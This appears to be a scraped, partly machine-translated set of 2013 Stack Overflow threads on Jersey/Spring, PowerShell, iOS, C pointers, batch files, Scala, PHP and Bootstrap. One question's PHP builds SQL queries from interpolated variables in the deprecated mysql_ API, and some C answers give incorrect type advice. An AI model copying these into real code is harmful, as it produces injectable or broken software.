I'm building a REST API for performing CRUD operations on a database. My tentative stack is Jersey, Spring, Spring Data, JPA and Hibernate. I'm also using jersey-spring to supply instances of the resource class so Spring can autowire them.

The API will support CRUD operations on dozens of tables, with concomitant JPA Entities and DAOs backed by Spring Data repositories. The family of DAO interfaces and related DTOs looks something like this:

```
public interface CrudService<T extends PersistedObject> { /* ... */  }
public interface PersonService extends CrudService<Person> { /* ... */  }

public class PersistedObject { /* ... */ }
public class Person extends PersistedObject { /* ... */ } 
```

Here's a simplified version of a JAX-RS resource class:

```
@Component
@Path("/people")
public class PersonResource {

    @Autowired
    private PersonService personService;

    @Path("/{id}")
    @GET
    @Produces(MediaType.APPLICATION_JSON)
    public Person get(@PathParam("id") String id) {
        return personService.findOne(Long.valueOf(id));
    }

    @POST
    @Consumes(MediaType.APPLICATION_JSON)
    public Response post(Person person) {
        personService.save(person);
        return Response.created().build();
    }
} 
```

The problem is that remainder of the dozens of resource classes look almost identical, the only difference being they operate on a different PersistedObject subclass and its corresponding DAO. I'd like to stay DRY by having one resource class that can support the CRUD operations on all entity types, presumably via polymoprhism and clever injection of the DAO. It might look something like this:

```
@Component
@Path("/{resourceType}")
public class CrudResource {

    @Autowired
    private CrudService crudService;

    @Path("/{id}")
    @GET
    @Produces(MediaType.APPLICATION_JSON)
    public PersistedObject get(@PathParam("id") String id) {
        return crudService.findOne(Long.valueOf(id));
    }

    @POST
    @Consumes(MediaType.APPLICATION_JSON)
    public Response post(PersistedObject entity) {
        crudService.save(entity);
        return Response.created().build();
    }
} 
```

The issues I need to solve:

*   If resource methods accept and return PersistedObject, how will Jersey/Jackson know how to serialize/deserialize? The `resourceType` variable in the path parameter indicates the concrete type the user is requesting, but I don't know how to wield this to any advantage.
*   When Spring supplies the resource class instance, how will it know which DAO to inject?

Overall, I'm not sure that I'm on the right path. Is it possible to implement this in a generic way?

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-07T05:33:22.467

I've run into this problem myself a few times. You can create a generic endpoint and a PersistedObjectDao and it should all work just fine. In Hibernate, session methods such as persist(), merge(), and delete() don't care about what it gets so long as it is a managed object or can become a managed object (in the case of merge()). Since you're only finding by id, and that should be managed in the PersistedObject class rather than the Person class, the functionality of the DAO will work just fine.

The only problem with this approach is that it breaks documentation tools such as Enunciate and makes the resource urls require globally unique ids. /xxx/1 and /yyy/1 cannot coexist. The findOne method will return the same object for both. This means that you will have to use @Inheritance(strategy = InheritanceType.JOINED) to avoid id collisions and create a globally unique id column across all persisted entities in the database.

Because of this I generally create an AbstractPersistedObjectDAO class and implement persist(), merge(), and delete() and abstract the findOne() to a subclass to avoid the need to cast in code if I ever need to do more than CRUD. But I generally just eat the cost of the boilerplate on the endpoints so that I can produce the REST documentation with Enunciate and it gives me a class to take on additional methods in the future if needed.

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-07T09:59:03.317

Not sure if you're tied to JAX-RS in any way but the Spring Data family of projects comes with the [Spring Data REST](https://github.com/SpringSource/spring-data-rest) module that automatically exposes entities managed by Spring Data repositories in a hypermedia-driven way. It's based on Spring MVC.

So you essentially get CRUD operations on the entities for free, query methods exposed transparently and the ability to tweak and tune close to everything according to your needs.

Here are some useful links you might want to browse for further information:

*   [Reference documentation](http://static.springsource.org/spring-data/rest/docs/1.1.0.M1/reference/htmlsingle/)
*   [Spring Data REST sample project](https://github.com/SpringSource/spring-data-book/tree/master/rest) - taken from the Spring Data book available [here](https://www.google.de/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&ved=0CDEQFjAA&url=http://shop.oreilly.com/product/0636920024767.do&ei=LGQ4UbvSC83ptQa7xIHYBw&usg=AFQjCNETlscmy9j0zVYqRp7mUlArI8nf0Q&sig2=oqJ4qY4oKoayPGtmb5dbbg&bvm=bv.43287494,d.Yms).
*   [Spring RESTBucks](https://github.com/olivergierke/spring-restbucks) - a more advanced sample showing how to augment the entities exported with custom more complex functionality to implement business processes in a hypermedia-driven way.

# powershell - Powershell NetSecurity 模块在哪里？

> ID：15262426
> 
> 赞同：7
> 
> 时间：2013-03-07T03:13:36.323
> 
> 标签：powershell

我似乎无法`NetSecurity`在我的系统上找到该模块。我正在使用一个`Amazon Windows 2008 Server R2 SP1`实例。

`Get-Module -ListAvailable`在我的环境中返回这个：

```
ActiveDirectory (I installed this)    
ADRMS    
AppLocker    
BestPractices    
BitsTransfer    
CimCmdlets    
ISE    
Microsoft.PowerShell.Diagnostics/Host/Management/Security/Utility    
Microsoft.WSMan.Management    
PSDiagnostics    
PSScheduledJob    
PSWorkflow    
PSworkflowUtility    
ServerManaer    
TroubleshootingPack 
```

我试过安装`WMF 3.0`，但据说已经安装了。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-03-07T04:35:24.620

这些是[powershell 3.0](http://technet.microsoft.com/en-us/library/hh801904.aspx)中的新模块，**仅作为****Windows Server 2012**附带的角色/功能的一部分包含在内，在某些情况下，它们也**可用于 Windows 8**。不幸的是，它们不能安装在以前版本的 Windows 上，并且`NetSecurity`是该模块之一

# ios - iOS 应用程序是否共享框架？

> ID：15262427
> 
> 赞同：5
> 
> 时间：2013-03-07T03:13:38.850
> 
> 标签：ios

如果在使用相同框架的同一设备上安装了多个应用程序，是框架代码的多个副本存储在设备上还是所有应用程序共享它们？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-03-07T03:16:58.320

如果它是系统提供的框架，那么每个应用程序都使用该框架的共享系统副本。如果它是您下载并添加到项目中的框架，那么您的应用程序将使用该私有副本。（对于 OS X 应用程序和框架也是如此）。

（请注意，非系统 iOS 框架必须是静态的，因此它们无论如何都不能在应用程序之间共享。但是，即使动态库框架是可能的，这个答案也适用，就像 OS X 上的情况一样）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-07T03:17:01.457

我猜你可以说系统框架是“共享的”。更重要的是，应用程序**链接**到系统上的框架。

# c++ - 无法使用指针打印二维矩阵的值

> ID：15262429
> 
> 赞同：0
> 
> 时间：2013-03-07T03:13:46.527
> 
> 标签：c++, arrays, pointers, 2d

我在使用指针时遇到了一些麻烦。我试图填充这个 2D 矩阵，但我无法打印它们的值。你能看一下并给我一个提示吗？

```
#include <stdio.h>
#include <stdlib.h>

#define L1  3
#define C1  2

#define L2  4
#define C2  3

void write(int *p, int n_lin, int n_col){

int i,j;

    for(i=0;i<n_lin;i++){
        for(j=0;j<n_col;j++){
            printf("%d",*p[i][j]);  // <- Can't make it work :(
        }
        printf("\n");
    }
}
void main(){

int *p=NULL;
int mat1[L1][C1] = {{1,2}, {3,4}, {5,6}};

int mat2[L2][C2] = {{1,2,3}, {4,5,6}, {7,8,9}, {10,11,12}};

printf("Matriz 1:\n");
write(*mat1, L1, C1);

printf("\nMatriz 2:\n");
write(*mat2, L2, C2);

system("pause");
} 
```

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-07T03:19:39.827

当您创建一个二维数组时

```
int mat1[L1][L2]; 
```

你`mat1`的类型是`int**`.

因此，您必须更改调用函数的方式：

```
void write(int **p, int n_lin, int n_col){ // <- changed this
int i,j;
    for(i=0;i<n_lin;i++){
        for(j=0;j<n_col;j++){
            printf("%d",p[i][j]);  // <- Changed this! :)
        }
        printf("\n");
    }
} 
```

并调用它

```
write(mat1, L1, C1); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-07T03:16:24.567

你的 for 循环应该是：

```
for(i=0;i<n_lin;i++){
    for(j=0;j<n_col;j++){
        printf("%d",p[i][j]);  // *p[i][j] should be p[i][j]
    }
    printf("\n");
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-07T03:17:49.953

尝试将打印语句更改为：

```
printf("%d",*( p + i*n_lin + j)); 
```

除此之外，还有一些问题。

* * *

在函数定义中，尝试使用

```
void write(int p[][], int n_lin, int n_col){ 
```

然后使用 ,

```
printf("%d",p[i][j])); 
```

并用它来称呼它，

```
write(mat1, L1, C1); 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-03-07T03:58:58.813

你可以像这样创建你的写函数：

```
template <int n_lin,int n_col>
void write(const int (&p)[n_lin][n_col])
{

    int i,j;

    for(i=0;i<n_lin;i++) {
        for(j=0;j<n_col;j++) {
            printf("%d ",p[i][j]);
        }
        printf("\n");
    }
} 
```

然后打电话

```
write(mat1);
write(mat2); 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2013-03-07T04:01:05.287

关于指针和数组有一个重要方面：-

```
One dimension  ---     a[i]  = *(a+i)
Two dimension  ---     a[i][j] = *(*(a+i)+j)   and so on... 
```

两者都是等价的....所以现在我相信您可以弄清楚问题所在:-)

# batch-file - 如果一个命令失败，则禁止输出块（并输出自定义错误消息）

> ID：15262434
> 
> 赞同：2
> 
> 时间：2013-03-07T03:14:08.293
> 
> 标签：batch-file

标题几乎总结了它，但我会详细说明我的问题。出于好奇，我一直将命令放在一个块中（通常使用一个不起作用的命令）并查看是否可以抑制错误消息并输出自定义消息。我尝试了两种方法，第一种失败但第二种有效。

# 1

```
@echo off
(
    echo Blah
    ehco Blah & rem Intentional mistake
    echo Blah
) 2>nul||echo One of the commands failed.
pause>nul 
```

输出：

```
Blah
Blah 
```

# 2

```
@echo off
call :block 2>nul||echo One of the commands failed.
pause>nul
exit
:block
(
    echo Blah
    ehco Blah & rem Intentional mistake
    echo Blah
)
goto :eof 
```

输出：

```
Blah
Blah
One of the commands failed. 
```

所以，我已经回答了问题的第二部分，现在我只需要知道如何（如果其中一个命令失败）抑制除自定义错误消息之外的任何输出。因此，所需的输出将是`One of the commands failed.`. 我该怎么做呢？

**注意：** 我听说你可以做类似`echo Blah 2>&1nul`或类似的事情，我想这就是要走的路。但我也猜想这会在每次运行命令时抑制输出，而不仅仅是在出现错误消息时。

另外，在您的回答中，如果您可以简要解释第一个脚本失败的原因，那将是花花公子。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-07T04:18:21.880

非常有趣的话题，但你还没有解决任何问题——你自欺欺人:-)

我运行了您的代码的细微变化，但事情不再像您期望的那样工作！

```
@echo off
:: clear any existing error
call;

echo %errorlevel%
(
    echo Blah
    ehco Blah & rem Intentional mistake
    echo Blah
) 2>nul||echo One of the commands failed.
echo %errorlevel%

echo(
echo --------------------------
echo(

echo %errorlevel%
call :block 2>nul||echo One of the commands failed.
echo %errorlevel%
exit /b

:block
echo Blah
echo Blah
echo Blah
exit /b 
```

- - 输出 - -

```
0
Blah
Blah
9009

--------------------------

9009
Blah
Blah
Blah
One of the commands failed.
9009 
```

通常，`||`只有在前面的命令失败时才会触发 after 的命令。操作者`||`通常不会`%ERRORLEVEL%`直接读取变量，它通常直接检测先前命令的错误状态。

在第一组代码中，其中一个命令失败，ERRORLEVEL 设置为 9009。但块中的最后一个命令成功，因此条件失败消息不会触发。

第二个代码块使用 CALL。执行 CALL 时，返回时的当前 %ERRORLEVEL% 通常用作 CALL 命令的返回状态。进入例程时 ERRORLEVEL 为 9009，例程中的任何命令都不能清除错误，因此返回 9009 作为 CALL 语句的错误状态。通过将错误级别指定为 EXIT /B 之后的附加参数，可以强制返回代码为任何值。例如，`exit /b 0`。

试图找出哪些命令总是设置 ERRORLEVEL 以及哪些命令仅在出现错误时才设置 ERRORLEVEL 可能会有点棘手。我相信内部命令仅在出现错误时设置 ERRORLEVEL，如果命令成功，则不清除任何先前的 ERRORLEVEL。（我假设`.BAT`扩展。我相信`.CMD`扩展会改变行为）

大多数（全部？）外部命令总是设置 ERRORLEVEL。这取决于可执行文件，但大多数外部命令返回 0 表示成功，非 0 表示失败。

由于代码块可能包含内部和外部命令的混合，因此如果任何命令失败，您不能假设最终的 ERRORLEVEL 将非零。干预的外部命令可能已清除 ERRORLEVEL。您应该检查每个命令的返回码并设置错误变量以保留块中存在的错误。然后，您可以使用 EXIT /B 显式返回所需的错误代码。

我认为仅在所有命令成功时才打印标准输出的唯一方法是将所有标准输出重定向到一个临时文件，并密切关注是否有任何命令失败。在块结束时，当且仅当没有错误时，您才能 TYPE 临时文件内容。然后无论如何删除临时文件。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-07T05:09:48.593

这是我的测试批次：

```
@echo OFF
call :block 2>nul||echo One of the commands failed 1.
call :block2 2>nul||echo One of the commands failed 2.
GOTO :eof

:block
(
    echo Blah
    ehco Blah & rem Intentional mistake
    echo Blah
)
goto :eof
:block2
(
    echo Blah
    echo Blah & rem Intentional mistake
    echo Blah
)
goto :eof 
```

运行它会产生

Blah Blah 其中一个命令失败 1\. Blah Blah Blah 其中一个命令失败 2.

无论是保存为 .bat 还是 .cmd

我会同意陈旧的错误级别理论——在调用 BLOCK2 子例程修复问题之前强制错误级别为 0。

因此，您获得的行为取决于现有的错误级别设置 - 您可能会得到意想不到的结果......

# scala - 有没有办法在 Scala 中模拟文件系统以进行单元测试

> ID：15262435
> 
> 赞同：1
> 
> 时间：2013-03-07T03:14:12.850
> 
> 标签：scala, filesystems, mocking

我正在寻找一种在 Scala 中模拟文件系统的方法。我想做这样的事情：

```
class MyMainClass(fs: FileSystem) {
   ...
} 
```

正常运行时间：

```
val fs = FileSystem.default
main = new MyMainClass(fs) 
```

测试时间：

```
val fs = new RamFileSystem
main = new MyMainClass(fs) 
```

我的示例看起来很像 Scala-IO，我认为这可能是我的答案。但是，看起来 Scala-IO 中的所有核心功能都不能与`FileSystem`抽象一起使用。特别是，我无法读取 a`Path`或 apply `Path.asInput`。此外，一些抽象类似于`Path`并且`Resource`似乎与`FileSystem.default`.

我还在 Scala-Tools 中搜索了一些有趣的东西，但那个项目似乎已经不复存在了。

抢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-07T03:38:33.480

一种选择是创建自己的抽象。像这样的东西：

```
trait MyFileSystem { def getPath() } 
```

然后，您可以使用真实的 FileSystem 和模拟版本来实现它。

```
class RealFileSystem(fs: FileSystem) extends MyFileSystem {
  def getPath() = fs.getPath()
}

class FakeFileSystem extends MyFileSystem {
  def getPath() = "/"
} 
```

然后 MyMainClass 可能需要一个 MyFileSystem 而不是 FileSystem

```
class MyMainClass(fs: MyFileSystem)
main = new MyMainClass(new RealFileSystem(FileSystem.default))
test = new MyMainClass(new FakeFileSystem) 
```

# php - html标签在textarea标签旁边显示changeline

> ID：15262436
> 
> 赞同：0
> 
> 时间：2013-03-07T03:14:15.340
> 
> 标签：php, html, textarea

我在添加表单中的 HTML 代码。

```
<textarea id="aboutme" rows="6"></textarea> 
```

我在 textarea 中输入：

```
Hi.
My name is Kevin.

Nice to meet you. 
```

我的编辑表格

```
<textarea id="aboutme" name="aboutme" rows="6"><?php echo (isset($item["aboutme"])) ? htmlspecialchars($item["aboutme"]) : "" ;?></textarea> 
```

一切正常，除非在我的其他页面中，我只想查看。我愿意 ：

```
<span>?php echo htmlspecialchars($item['aboutme'])?></span> 
```

好吧，更改线已在标签内**删除。** `span` 我必须`textarea`在我的视图页面中使用标签吗？我只是不认为其他人使用 textarea 标签来做到这一点。是否有任何其他标签可用于查看 changeline ？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-07T03:16:27.457

HTML 忽略换行符。最简单的是，这里的解决方案是通过`nl2br`.

```
<span><?php echo nl2br(htmlspecialchars($item['aboutme'])) ?></span> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-07T03:16:32.090

我假设您的意思是“换行符”，而不是“换行符”。

在 HTML 中，换行符（和任何其他空格）被折叠成一个单独的水平空间。您可以使用 CSS 覆盖它。像这样的东西会起作用：

```
<div style="white-space:pre-wrap;"><?php echo htmlspecialchars($item['aboutme']); ?>/div> 
```

# javascript - Twitter Bootstrap 选项卡选择不更改内容

> ID：15262440
> 
> 赞同：7
> 
> 时间：2013-03-07T03:15:02.070
> 
> 标签：javascript, html, twitter-bootstrap

尽管有很多 Twitter Bootstrap 问题与我遇到的类似问题有关，但我无法找到任何解决我的特定问题的方法。我正在使用 twitter 引导程序“选项卡”功能来显示内容，虽然脚本成功更改了更改活动选项卡，但内容保持不变。

这是代码：

```
<!DOCTYPE html>
<html lang="en">
    <head>
        <title>Hello, Tabs!</title>

        <link rel="stylesheet" href="public/css/bootstrap.min.css">
        <script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.7/jquery.js"></script>
        <script type="text/javascript" src="public/js/bootstrap.min.js"></script>
    </head>
    <body>

     <h3>Version Information:</h3>
     <div class="tabbable tabs-left">
         <ul class="nav nav-tabs" data-tabs="tabs">
             <li class="active">
                 <a href="#project/src/Graph/Graph.pm__0" data-toggle="tab">9424</a>
             </li>
             <li>
                 <a href="#project/src/Graph/Graph.pm__1" data-toggle="tab">9058</a>
             </li>
             <li>
                 <a href="#project/src/Graph/Graph.pm__2" data-toggle="tab">8928</a>
             </li>
             <li>
                 <a href="#project/src/Graph/Graph.pm__3" data-toggle="tab">8926</a>
             </li>
             <li>
                 <a href="#project/src/Graph/Graph.pm__4" data-toggle="tab">8924</a>
             </li>
             <li>
                 <a href="#project/src/Graph/Graph.pm__5" data-toggle="tab">8890</a>
             </li>
             <li>
                 <a href="#project/src/Graph/Graph.pm__6" data-toggle="tab">8889</a>
             </li>
             <li>
                 <a href="#project/src/Graph/Graph.pm__7" data-toggle="tab">8887</a>
             </li>
         </ul>
         <div class="tab-content">
             <div class="tab-pane active" id="project/src/Graph/Graph.pm__0">
                 <p>
                 Author: joe<br>
                 Version: v9424 (1:31 pm February 28, 2013)<br>
                 Action: Modified<br>
                 Message: Finalized a bit of the code... should be better now.<br>
                 </p>
             </div>
             <div class="tab-pane" id="project/src/Graph/Graph.pm__1">
                 <p>
                 Author: joe<br>
                 Version: v9058 (9:13 pm February 26, 2013)<br>
                 Action: Modified<br>
                 Message: Hello, world!<br>
                 </p>
             </div>
             <div class="tab-pane" id="project/src/Graph/Graph.pm__2">
                 <p>
                 Author: joe<br>
                 Version: v8928 (2:08 am February 25, 2013)<br>
                 Action: Modified<br>
                 Message: Hello, world!<br>
                 </p>
             </div>
             <div class="tab-pane" id="project/src/Graph/Graph.pm__3">
                 <p>
                 Author: joe<br>
                 Version: v8926 (1:14 am February 25, 2013)<br>
                 Action: Modified<br>
                 Message: Hello, world!<br>
                 </p>
             </div>
             <div class="tab-pane" id="project/src/Graph/Graph.pm__4">
                 <p>
                 Author: joe<br>
                 Version: v8924 (10:26 pm February 24, 2013)<br>
                 Action: Modified<br>
                 Message: Hello, world!<br>
                 </p>
             </div>
             <div class="tab-pane" id="project/src/Graph/Graph.pm__5">
                 <p>
                 Author: joe<br>
                 Version: v8890 (9:59 pm February 23, 2013)<br>
                 Action: Modified<br>
                 Message: Hello, world!<br>
                 </p>
             </div>
             <div class="tab-pane" id="project/src/Graph/Graph.pm__6">
                 <p>
                 Author: joe<br>
                 Version: v8889 (9:53 pm February 23, 2013)<br>
                 Action: Added<br>
                 Message: Hello, world!<br>
                 </p>
             </div>
             <div class="tab-pane" id="project/src/Graph/Graph.pm__7">
                 <p>
                 Author: joe<br>
                 Version: v8887 (9:40 pm February 23, 2013)<br>
                 Action: Added<br>
                 Message: Hello, world!<br>
                 </p>
             </div>
         </div>
     </div>

    <script type="text/javascript">
    jQuery(document).ready(function ($) {
        $('.nav-tabs').tab();
    });
    </script>
    </body>
</html> 
```

当我运行它时，所有依赖文件都加载得很好（作为参考，正在使用的引导程序版本是 2.3.1）。我一直在处理这个问题已经有一段时间了，所以任何帮助都将不胜感激。

编辑：[这是](http://jsfiddle.net/C3gQb/2/)一个包含错误代码的 jsfiddle 链接。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-03-07T03:18:28.380

您需要将 Bootstrap 脚本引用移动到您的就绪事件**上方。**因此，您的页面底部应如下所示：

```
<script src="public/js/bootstrap.min.js"></script>
<script>
jQuery(document).ready(function ($) {
    $('.nav-tabs').tab();
});
</script> 
```

此外，由于您指定了 HTML5 文档类型，因此该`type`属性在`script`标记中是可选的。

**编辑 2**：

我相当肯定你可以摆脱手动选项卡绑定 - 我不在我的网站上使用它，这个 jsFiddle 也不这样做：http: [//jsfiddle.net/C3gQb/](http://jsfiddle.net/C3gQb/)

如您所见，您只需要绑定“标签”的点击事件，然后它就会起作用。这应该有效：

```
<script src="public/js/bootstrap.min.js"></script>
<script>
$(function(){ 
    $('.nav-tabs a').on('click', function (e) {
        e.preventDefault();
        $(this).tab('show');
    });  
});
</script> 
```

如果没有，我怀疑您的浏览器/开发环境有一些不寻常的地方，这在您发布的内容中并不明显。

**编辑 4**

是的，我们已经用您的新 jsFiddle 隔离了问题。我调整了这个版本的前 2 个：http: [//jsfiddle.net/C3gQb/4/](http://jsfiddle.net/C3gQb/4/) - 这两个现在可以工作了：

```
$(function(){
    $('.nav-tabs a').on('click', function (e) {
        e.preventDefault();
        $(this).tab('show');
    });
});
```

```
<link href="https://maxcdn.bootstrapcdn.com/twitter-bootstrap/2.3.2/css/bootstrap-combined.min.css"/>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/twitter-bootstrap/2.3.2/js/bootstrap.min.js"></script>

<h3>Version Information:</h3>
<div class="tabbable tabs-left">
  <ul class="nav nav-tabs" data-tabs="tabs">
    <li class="active">
      <a href="#project-src-Graph-Graph-pm__0" data-toggle="tab">9424</a>
    </li>
    <li>
      <a href="#project-src-Graph-Graph-pm__1" data-toggle="tab">9058</a>
    </li>
    <li>
      <a href="#project/src/Graph/Graph.pm__2" data-toggle="tab">8928</a>
    </li>
    <li>
      <a href="#project/src/Graph/Graph.pm__3" data-toggle="tab">8926</a>
    </li>
    <li>
      <a href="#project/src/Graph/Graph.pm__4" data-toggle="tab">8924</a>
    </li>
    <li>
      <a href="#project/src/Graph/Graph.pm__5" data-toggle="tab">8890</a>
    </li>
    <li>
      <a href="#project/src/Graph/Graph.pm__6" data-toggle="tab">8889</a>
    </li>
    <li>
      <a href="#project/src/Graph/Graph.pm__7" data-toggle="tab">8887</a>
    </li>
  </ul>
  <div class="tab-content">
    <div class="tab-pane active" id="project-src-Graph-Graph-pm__0">
      <p>
        Author: joe<br>
        Version: v9424 (1:31 pm February 28, 2013)<br>
        Action: Modified<br>
        Message: Finalized a bit of the code... should be better now.<br>
      </p>
    </div>
    <div class="tab-pane" id="project-src-Graph-Graph-pm__1">
      <p>
        Author: joe<br>
        Version: v9058 (9:13 pm February 26, 2013)<br>
        Action: Modified<br>
        Message: Hello, world!<br>
      </p>
    </div>
    <div class="tab-pane" id="project/src/Graph/Graph.pm__2">
      <p>
        Author: joe<br>
        Version: v8928 (2:08 am February 25, 2013)<br>
        Action: Modified<br>
        Message: Hello, world!<br>
      </p>
    </div>
    <div class="tab-pane" id="project/src/Graph/Graph.pm__3">
      <p>
        Author: joe<br>
        Version: v8926 (1:14 am February 25, 2013)<br>
        Action: Modified<br>
        Message: Hello, world!<br>
      </p>
    </div>
    <div class="tab-pane" id="project/src/Graph/Graph.pm__4">
      <p>
        Author: joe<br>
        Version: v8924 (10:26 pm February 24, 2013)<br>
        Action: Modified<br>
        Message: Hello, world!<br>
      </p>
    </div>
    <div class="tab-pane" id="project/src/Graph/Graph.pm__5">
      <p>
        Author: joe<br>
        Version: v8890 (9:59 pm February 23, 2013)<br>
        Action: Modified<br>
        Message: Hello, world!<br>
      </p>
    </div>
    <div class="tab-pane" id="project/src/Graph/Graph.pm__6">
      <p>
        Author: joe<br>
        Version: v8889 (9:53 pm February 23, 2013)<br>
        Action: Added<br>
        Message: Hello, world!<br>
      </p>
    </div>
    <div class="tab-pane" id="project/src/Graph/Graph.pm__7">
      <p>
        Author: joe<br>
        Version: v8887 (9:40 pm February 23, 2013)<br>
        Action: Added<br>
        Message: Hello, world!<br>
      </p>
    </div>
  </div>
</div>
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-07T03:23:44.797

我可以看到您引用的是旧版本的 jQuery。可以升级到`1.9.x`吗？我不认为他们正在使用旧版本的 jQuery。

另外，试试这个：

```
<script type="text/javascript" src="public/js/bootstrap.min.js"></script>

<script type="text/javascript">
$(document).ready(function () {
    $('.nav-tabs').tab();
});
</script> 
```

另外，请将`bootstrap.min.js`函数前移。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2017-04-03T11:00:36.630

只需检查引导版本...应该是 v2.3.1 +

# c - fork() 后失去控制

> ID：15262446
> 
> 赞同：0
> 
> 时间：2013-03-07T03:15:48.027
> 
> 标签：c, shell, wait

我正在编写一个简单的程序来更好地理解 fork()、wait() 和 execvp()。我的问题是，在我运行程序之后，控制权没有传回给 shell，我不知道为什么。我想要的是能够在代码完成后将另一个命令输入到 shell 中。我看了一下[这个](https://stackoverflow.com/questions/14793636/child-processes-wont-die-in-c-program?rq=1)，但我认为它不适用于我的情况。我基本上只是从[这里](http://www.csl.mtu.edu/cs4411.ck/www/NOTES/process/fork/exec.html)找到的复制代码。

输入/输出（# 在我输入的行前面，虽然不是输入的一部分）：

```
shell> # gcc test.c -o test
shell> # ./test
input program (ls)
# ls
input arg (.)
# .
test test.c extra.txt
# a;dlghasdf
# go back
# :( 
```

我的代码：

```
int main(void) {
    //just taking and cleaning input
    printf("input program (ls)\n");
    char inputprogram [5] = {0,0,0,0,0};
    fgets(inputprogram,5,stdin); //read in user command
    int i;
    for(i = 0; i < 5; i++) {
        if(inputprogram [i] == '\n' ){
            inputprogram[i] = 0;
        }
    }

    printf("input arg (.)\n");
    char inputarg [5] = {0,0,0,0,0};
    fgets(inputarg,5,stdin); //read in user command
    for(i = 0; i < 5; i++) {
        if(inputarg [i] == '\n' ){
            inputarg[i] = 0;
        }
    }

    char per []= {inputarg[0], 0};
    char *arg [] = {inputprogram, per , NULL};

    int status = 0;
    pid_t child;

    //the fork(), execvp(), wait()
    //////////////////////////////////
    if ((child = fork()) < 0) {
        /* fork a child process           */
        printf("*** ERROR: forking child process failed\n");
        exit(1);
    } else if(child == 0){
        execvp(inputprogram, arg);
        exit(1);
    } else {
        while(wait(&status != child));
    }

    return EXIT_SUCCESS;
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-07T03:20:38.593

这条线

```
while(wait(&status != child)); 
```

是不正确的

你需要

```
wait(&status); 
```

或使用`waitpid`- 见[这里](http://linux.die.net/man/2/wait)

# php - 如何在php中限制关联数组？

> ID：15262447
> 
> 赞同：0
> 
> 时间：2013-03-07T03:15:56.817
> 
> 标签：php, arrays, associative-array

我有一个关联数组，如下所示

```
Array ( [1274] => 2 [2700] => 3 [2701] => 4 [2702] => 2 [2699] => 2 [2698] => 1 [2694] => 1......) 
```

我想要的是从这个数组中取出前 10 个元素。我用过`array_slice`。但是新的数组会像

```
Array ( [0] => 2 [1] => 3 [2] => 4 [3] => 2 [4] => 2 [5] => 1 [6] => 1.....) 
```

它限制了数组，但数组键已被删除。我怎样才能得到钥匙呢？感谢您的建议。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-07T03:18:48.313

好吧，你可以这样做：

```
$slice = array_intersect_key($whole,array_flip(array_slice(array_keys($whole),0,10))); 
```

如果您想要更具可读性的内容，这将起作用：

```
$keys = array_keys($whole);
$slice = Array();
$firstkeys = array_slice($keys,0,10);
foreach($firstkeys as $key) $slice[$key] = $whole[$key]; 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-07T03:36:31.037

您可以限制数组的迭代并将其转换回数组：

```
$first = iterator_to_array(new LimitIterator(new ArrayIterator($array), 0, 10)); 
```

[演示](http://eval.in/12076)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-07T07:00:51.413

尝试这个 ：

```
$res    = array_chunk($array,10,true);

echo "<pre>";
print_r($res[0]); 
```

如果你想知道第二组10只`print_r($res[1]);`

# php - 限制每日提交到数据库

> ID：15262450
> 
> 赞同：0
> 
> 时间：2013-03-07T03:16:03.120
> 
> 标签：php, sql

我对编码和 php 非常陌生，所以我意识到这可能不是实现我目标的理想编码方式。我的目标是允许每天提交一个表格。我设置了一个等于数字的变量。然后它应该查询表以查看是否有一行包含数字和会话的用户。如果已经存在具有该编号的行，我不希望将任何新信息提交到表中。如果该行不存在，我希望将 User 和 Number 放入表中。

```
 $nd = '5';
        $nd = $td;

    $connect = mysql_connect("a","a","a") or die ("Problem Connecting to Database"); 
mysql_select_db("a") or die ("Can't find database");            

$query1 = mysql_query("SELECT * From p1 WHERE td='$td'");

$numrows1 = mysql_num_rows($query1);

if($numrows1 !=9999)
{
    while($rows1 = mysql_fetch_assoc($query1))
    {
        $dbtd = $rows1['td'];   

    }
            if ($dbtd==$td)
            {
                echo "You have already submitted Today.";   

            }
            else
            {

    $connect = mysql_connect("a","a","a") or die ("Problem Connecting to Database"); 
            mysql_select_db("a") or die ("Can't find database");
            $query = mysql_query("INSERT INTO p1 VALUES('$name','$nd')");
            die("Submission Complete <a href = 'a'>Go Home</a>");

            }

    } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-07T03:34:39.180

我只建议创建一个`date`具有唯一索引的日期列（类型），该索引将每天强制执行一条记录。

# html - 如何在不修改的情况下将 HTML 源代码插入我的网站？

> ID：15262451
> 
> 赞同：0
> 
> 时间：2013-03-07T03:16:09.523
> 
> 标签：html, iframe, pre

在我网页的一部分中显示了 HTML 的源代码（带有 a `<body>`、 a `<head>`、 ALL 可以有 HTML 代码），用户可以提取代码。我将文本文件中的代码放入 iframe 中。问题：iframe 在 IE8 等浏览器中不起作用，因为在 Chrome 等现代浏览器中，它们会`<pre>`在 iframe 中插入 a，而 IE8 则不行。

